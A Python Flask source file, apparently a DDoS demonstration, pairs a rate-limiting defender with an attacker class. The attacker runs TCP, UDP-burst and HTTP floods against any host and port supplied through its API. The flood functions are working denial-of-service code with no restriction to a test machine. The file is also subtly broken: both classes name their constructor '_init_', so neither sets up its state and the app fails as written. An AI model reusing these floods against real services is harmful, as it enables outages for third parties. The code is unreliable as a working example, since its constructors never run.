import os
import threading
import time
from flask import Flask, render_template, jsonify, request, Response
from collections import defaultdict, deque
import logging
import socket
import random
import queue
import json
from datetime import datetime

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    filename='ddos_demo.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class DDoSDefender:
    def _init_(self):
        self.connections = defaultdict(lambda: {
            'timestamps': deque(maxlen=100),
            'bytes_received': deque(maxlen=100),
            'packet_sizes': deque(maxlen=100),
            'request_count': 0,
            'warning_count': 0
        })
        
        self.blocked_ips = set()
        self.suspicious_ips = set()
        self.attack_log = deque(maxlen=1000)
        self.metrics_queue = queue.Queue()
        
        self.thresholds = {
            'requests_per_second': 10,
            'min_request_interval': 0.1,
            'warning_threshold': 3,
            'block_duration': 300,
            'max_bandwidth_per_ip': 1024 * 1024
        }
        
        self.metrics = {
            'total_connections': 0,
            'blocked_attacks': 0,
            'bytes_processed': 0,
            'attack_status': 'No Attack',
            'protection_status': 'Active',
            'last_attack_time': None
        }
        
        self.running = True
        threading.Thread(target=self.update_metrics, daemon=True).start()

    def check_request(self, ip, request_size):
        """Analyze incoming request for DDoS patterns"""
        if ip in self.blocked_ips:
            return False
            
        conn_data = self.connections[ip]
        current_time = time.time()
        
        conn_data['timestamps'].append(current_time)
        conn_data['bytes_received'].append(request_size)
        conn_data['request_count'] += 1
        
        # Check request rate
        recent_requests = len([t for t in conn_data['timestamps'] 
                             if current_time - t <= 1])
        if recent_requests > self.thresholds['requests_per_second']:
            self.warn_ip(ip, "Rate limit exceeded")
            return False
        
        # Update metrics
        self.metrics['total_connections'] += 1
        self.metrics['bytes_processed'] += request_size
        
        return True

    def warn_ip(self, ip, reason):
        conn_data = self.connections[ip]
        conn_data['warning_count'] += 1
        
        if conn_data['warning_count'] >= self.thresholds['warning_threshold']:
            self.block_ip(ip, reason)
        elif ip not in self.suspicious_ips:
            self.suspicious_ips.add(ip)
            
        self.attack_log.append({
            'time': datetime.now().strftime('%H:%M:%S'),
            'ip': ip,
            'reason': reason
        })
        
        self.metrics['attack_status'] = 'Attack Detected'
        self.metrics['last_attack_time'] = datetime.now().strftime('%H:%M:%S')

    def block_ip(self, ip, reason):
        if ip not in self.blocked_ips:
            self.blocked_ips.add(ip)
            self.metrics['blocked_attacks'] += 1
            
            if ip in self.suspicious_ips:
                self.suspicious_ips.remove(ip)
            
            logging.info(f"Blocked IP {ip}: {reason}")
            
            # Schedule unblock
            threading.Timer(
                self.thresholds['block_duration'],
                lambda: self.unblock_ip(ip)
            ).start()

    def unblock_ip(self, ip):
        if ip in self.blocked_ips:
            self.blocked_ips.remove(ip)
            if ip in self.connections:
                del self.connections[ip]

    def update_metrics(self):
        while self.running:
            metrics = {
                'total_connections': len(self.connections),
                'blocked_ips': len(self.blocked_ips),
                'suspicious_ips': len(self.suspicious_ips),
                'blocked_attacks': self.metrics['blocked_attacks'],
                'attack_status': self.metrics['attack_status'],
                'protection_status': self.metrics['protection_status'],
                'last_attack_time': self.metrics['last_attack_time'],
                'recent_attacks': list(self.attack_log)[-5:]
            }
            self.metrics_queue.put(metrics)
            time.sleep(1)

class DDoSAttacker:
    def _init_(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.running = False
        self.attack_thread = None
        self.attack_type = None
        self.metrics = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'successful_hits': 0,
            'blocked_attempts': 0
        }

    def start_attack(self, attack_type):
        self.running = True
        self.attack_type = attack_type
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.stop_attack()
            
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            daemon=True
        )
        self.attack_thread.start()

    def stop_attack(self):
        self.running = False
        if self.attack_thread:
            self.attack_thread.join(timeout=1)

    def run_attack(self):
        attack_functions = {
            'tcp_flood': self.tcp_flood,
            'udp_flood': self.udp_flood,
            'http_flood': self.http_flood
        }
        
        if self.attack_type in attack_functions:
            attack_functions[self.attack_type]()

    def tcp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                
                payload = self.generate_payload()
                sock.send(payload)
                
                self.metrics['packets_sent'] += 1
                self.metrics['bytes_sent'] += len(payload)
                self.metrics['successful_hits'] += 1
                
                sock.close()
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                self.metrics['blocked_attempts'] += 1
                time.sleep(1)

    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                for _ in range(50):  # Burst mode
                    payload = self.generate_payload()
                    sock.sendto(payload, (self.target_host, self.target_port))
                    
                    self.metrics['packets_sent'] += 1
                    self.metrics['bytes_sent'] += len(payload)
                    self.metrics['successful_hits'] += 1
                    
                sock.close()
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                self.metrics['blocked_attempts'] += 1
                time.sleep(1)

    def http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_host, self.target_port))
                
                # Generate random HTTP request
                request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                request += f"Host: {self.target_host}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                sock.send(request.encode())
                
                self.metrics['packets_sent'] += 1
                self.metrics['bytes_sent'] += len(request)
                self.metrics['successful_hits'] += 1
                
                sock.close()
                time.sleep(random.uniform(0.1, 0.3))
                
            except:
                self.metrics['blocked_attempts'] += 1
                time.sleep(1)

    def generate_payload(self):
        return os.urandom(random.randint(64, 1024))

    def get_metrics(self):
        return {
            'packets_sent': self.metrics['packets_sent'],
            'bytes_sent': self.metrics['bytes_sent'],
            'successful_hits': self.metrics['successful_hits'],
            'blocked_attempts': self.metrics['blocked_attempts'],
            'attack_type': self.attack_type,
            'status': 'Running' if self.running else 'Stopped'
        }

# Initialize defender and attacker
defender = DDoSDefender()
attacker = None

@app.before_request
def check_for_ddos():
    """Check each request for DDoS patterns"""
    if request.endpoint != 'static':
        ip = request.remote_addr
        content_length = request.content_length or 0
        
        if not defender.check_request(ip, content_length):
            return jsonify({'error': 'Access denied'}), 403

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/shield')
def shield():
    return render_template('shield.html')

@app.route('/api/start_protection', methods=['POST'])
def start_protection():
    global attacker
    data = request.json
    target = data.get('target', 'localhost')
    port = data.get('port', 80)
    
    # Initialize attacker for demo
    attacker = DDoSAttacker(target, port)
    
    return jsonify({'status': 'Protection started'})

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    if attacker:
        data = request.json
        attack_type = data.get('type', 'tcp_flood')
        attacker.start_attack(attack_type)
        return jsonify({'status': 'Attack started'})
    return jsonify({'error': 'Protection not started'}), 400

@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    if attacker:
        attacker.stop_attack()
        return jsonify({'status': 'Attack stopped'})
    return jsonify({'error': 'No attack running'}), 400

@app.route('/api/metrics')
def get_metrics():
    try:
        defense_metrics = defender.metrics_queue.get_nowait()
    except queue.Empty:
        defense_metrics = {}
        
    attack_metrics = attacker.get_metrics() if attacker else {}
    
    return jsonify({
        'defense': defense_metrics,
        'attack': attack_metrics
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
